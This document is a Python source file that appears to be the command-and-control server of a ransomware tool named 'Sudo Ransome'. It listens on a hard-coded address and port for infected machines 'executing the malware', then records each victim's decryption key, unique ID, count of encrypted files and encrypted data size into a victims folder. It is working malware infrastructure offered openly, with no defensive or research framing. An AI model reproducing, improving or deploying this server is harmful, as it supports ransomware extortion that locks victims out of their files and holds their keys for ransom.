from colorama import Fore, Style
import socket
import time
import os

app_banner = r'''
  ██████  █    ██ ▓█████▄  ▒█████      ██▀███   ▄▄▄       ███▄    █   ██████  ▒█████   ███▄ ▄███▓▓█████ 
▒██    ▒  ██  ▓██▒▒██▀ ██▌▒██▒  ██▒   ▓██ ▒ ██▒▒████▄     ██ ▀█   █ ▒██    ▒ ▒██▒  ██▒▓██▒▀█▀ ██▒▓█   ▀ 
░ ▓██▄   ▓██  ▒██░░██   █▌▒██░  ██▒   ▓██ ░▄█ ▒▒██  ▀█▄  ▓██  ▀█ ██▒░ ▓██▄   ▒██░  ██▒▓██    ▓██░▒███   
  ▒   ██▒▓▓█  ░██░░▓█▄   ▌▒██   ██░   ▒██▀▀█▄  ░██▄▄▄▄██ ▓██▒  ▐▌██▒  ▒   ██▒▒██   ██░▒██    ▒██ ▒▓█  ▄ 
▒██████▒▒▒▒█████▓ ░▒████▓ ░ ████▓▒░   ░██▓ ▒██▒ ▓█   ▓██▒▒██░   ▓██░▒██████▒▒░ ████▓▒░▒██▒   ░██▒░▒████▒
▒ ▒▓▒ ▒ ░░▒▓▒ ▒ ▒  ▒▒▓  ▒ ░ ▒░▒░▒░    ░ ▒▓ ░▒▓░ ▒▒   ▓▒█░░ ▒░   ▒ ▒ ▒ ▒▓▒ ▒ ░░ ▒░▒░▒░ ░ ▒░   ░  ░░░ ▒░ ░
░ ░▒  ░ ░░░▒░ ░ ░  ░ ▒  ▒   ░ ▒ ▒░      ░▒ ░ ▒░  ▒   ▒▒ ░░ ░░   ░ ▒░░ ░▒  ░ ░  ░ ▒ ▒░ ░  ░      ░ ░ ░  ░
░  ░  ░   ░░░ ░ ░  ░ ░  ░ ░ ░ ░ ▒       ░░   ░   ░   ▒      ░   ░ ░ ░  ░  ░  ░ ░ ░ ▒  ░      ░      ░   
      ░     ░        ░        ░ ░        ░           ░  ░         ░       ░      ░ ░         ░      ░  ░
                   ░                                                                                    '''

class SudoRansome_Server(object):

    def __init__(self):
        self.server_socket = None
        self.app_banner = app_banner
        self.host_address = '192.168.33.173'
        self.port = 8052

    def create_server(self):
        for line in self.app_banner.split('\n'):
            print(f'{Fore.LIGHTRED_EX}{line}{Style.RESET_ALL}')
            time.sleep(0.2)
        print(f'\n\n\t\t{Fore.LIGHTGREEN_EX} [ Developed By: Tesfahiwet Truneh ]{Style.RESET_ALL} \n\n')
        time.sleep(0.2)
        try:
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            # resuse port address
            self.server_socket.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR, 1)

        except Exception as e:
            print(f'{Fore.RED}[*] {Style.RESET_ALL}Exception occured creating server socket object')
            time.sleep(0.2)
            self.create_server()
        self.bind_address()
    
    def bind_address(self):
        try:
            self.server_socket.bind((self.host_address, self.port))
            self.server_socket.listen(5)
            print(f'{Fore.BLUE}[*] {Style.RESET_ALL}Started reverse TCP on {self.host_address}:{self.port}')
            print(f'{Fore.BLUE}[*] {Style.RESET_ALL}Server started\n')
        except Exception as e:
            print(f'{Fore.RED}[!] {Style.RESET_ALL}Exception occured binding address to server socket {e}')
            time.sleep(0.2)
            self.bind_address()
        self.accept_conn()
    
    def accept_conn(self):
        device_counter = 0
        while True:
            try:
                device_counter += 1
                self.connection, self.address = self.server_socket.accept()
                print(f'\t({device_counter}) a machine {self.address[0]} is executing the malware')
                print('-'*64)
                self.connection.setblocking(1)
            except Exception as e:
                print(f'{Fore.RED}[!] {Style.RESET_ALL}Exception occured accepting connection {e}')
                time.sleep(0.2)
                self.accept_conn()
            self.accept_credential()
    
    def accept_credential(self):
        try:
            self.receive_message = self.connection.recv(1024).decode('utf-8')
            print(f'{Fore.YELLOW}[*]{Style.RESET_ALL} Decryption Key is {Fore.YELLOW}{self.receive_message.split("<saparator>")[0]}{Style.RESET_ALL}')
            print(f'{Fore.YELLOW}[*]{Style.RESET_ALL} Unique IDF Key is {Fore.YELLOW}{self.receive_message.split("<saparator>")[1]}{Style.RESET_ALL}')
            print(f'{Fore.YELLOW}[*]{Style.RESET_ALL} Number encrypted files {Fore.YELLOW}{self.receive_message.split("<saparator>")[2]}{Style.RESET_ALL}')
            print(f'{Fore.YELLOW}[*]{Style.RESET_ALL} Total file encrypted size {Fore.YELLOW}{round(float(self.receive_message.split("<saparator>")[3]), 3)} MB{Style.RESET_ALL}\n')
            if os.path.exists('victims'):
                with open(f'victims/{self.receive_message.split("<saparator>")[1]}', 'wb') as file_obj:
                    file_obj.write(self.receive_message.encode())
                file_obj.close()
        except Exception as e:
            print(f'{Fore.RED}[!] {Style.RESET_ALL} Exception occured receiving message {e}')
            time.sleep(0.2)
            self.accept_credential()


if __name__ == '__main__':
    SERVER = SudoRansome_Server()
    SERVER.create_server()